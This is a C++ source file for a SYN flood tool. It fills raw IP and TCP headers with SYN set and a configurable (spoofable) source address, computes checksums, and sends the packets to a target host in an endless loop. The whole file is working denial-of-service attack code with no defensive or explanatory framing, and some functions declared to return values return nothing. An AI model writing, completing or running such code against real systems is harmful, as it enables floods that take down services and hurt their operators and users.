#include<errno.h>
#include"synFlood.h"

void synFlood::attack()
{
    attackRun();
}

unsigned short synFlood::send()
{
    sendPacket();
}

unsigned short synFlood::checksum(unsigned short *ptr,int nbytes)
{// the sum of check
    long sum=0;
    unsigned short odd_byte;
    short answer;

    while(nbytes>1)
    {
        sum+=*ptr++;
        nbytes-=2;
    }

    if(1==nbytes)
    {
        odd_byte=0;//init
        *((unsigned char*)&odd_byte)=*(unsigned char*)ptr;
        sum+=odd_byte;
    }

    sum=(sum>>16)+(sum&0xFFFF);
    sum+=(sum>>16);
    answer=(short)~sum;
    return answer;
}

void synFlood::init()
{
    memset(_datagram,0,BUFF_SIZE);
    _sin.sin_family=AF_INET;//ipv4
    _sin.sin_port=htons(_port);
    _sin.sin_addr.s_addr=inet_addr(_destip);

    struct iphdr *iph=(struct iphdr*)_datagram;
    //fill in the ip header
    iph->ihl=5;//length of ip head:5 bytes
    iph->version=4;// version
    iph->tos=0;
    iph->tot_len=sizeof(struct ip)+sizeof(struct tcphdr);//the total length of ip header
    iph->id=htons(randomId());//id
    iph->frag_off=0;
    iph->protocol=IPPROTO_TCP;
    iph->check=0;
    iph->saddr=inet_addr(_sourceip);
    iph->daddr=_sin.sin_addr.s_addr;
    iph->check=checksum((unsigned short*)_datagram,iph->tot_len>>1);    

    struct tcphdr *tcph=(struct tcphdr*)(_datagram+sizeof(struct ip));
    //fill in the tcp header
    tcph->source=htons(1234);
    tcph->dest=htons(_port);
    tcph->seq=0;
    tcph->ack_seq=0;
    tcph->doff=5;
    tcph->fin=0;
    tcph->syn=1;
    tcph->rst=0;
    tcph->psh=0;
    tcph->ack=0;
    tcph->urg=0;
    tcph->window=htons(5840);
    tcph->check=0;
    tcph->urg_ptr=0;

    struct pseudo_header psh;
    psh.sour_addr=inet_addr(_sourceip);
    psh.dest_addr=_sin.sin_addr.s_addr;
    psh.placeholder=0;
    psh.protocol=IPPROTO_TCP;
    memcpy(&psh.tcph,tcph,sizeof(struct tcphdr));
    tcph->check=checksum((unsigned short*)&psh,sizeof(struct pseudo_header));
}

void synFlood::initSocket()
{
    _sock_fd=socket(AF_INET,SOCK_RAW,IPPROTO_TCP);
    if(-1==_sock_fd)
    {
        std::cout<<"error to create socket descriptor.errno:"<<errno<<",at "<<__LINE__<<".Error msg:"<<strerror(errno);
        exit(0);
    }

    int one=1;
    if(-1==setsockopt(_sock_fd,IPPROTO_IP,IP_HDRINCL,&one,sizeof(one)))
    {
        std::cout<<"Error setting IP_HDRINCL.Error number:"<<errno<<",at "<<__LINE__<<".Error msg:"<<strerror(errno);
        exit(0);
    }
}

void synFlood::attackRun()
{
    while(1)
    {
        sendPacket();
    }
}

unsigned short synFlood::sendPacket()
{
    static int count=0;
    struct iphdr *iph=(struct iphdr*)_datagram;
    if(sendto(_sock_fd,_datagram,iph->tot_len,0,(struct sockaddr*)&_sin,sizeof(_sin))<0)
    {
        std::cout<<"Send error!"<<std::endl;
    }
    else
    {
        std::cout<<"Send success "<<(++count)<<std::endl;
    }
}

void synFlood::setDest(const char* dest_addr)
{
    strcpy(_destip,dest_addr);
}

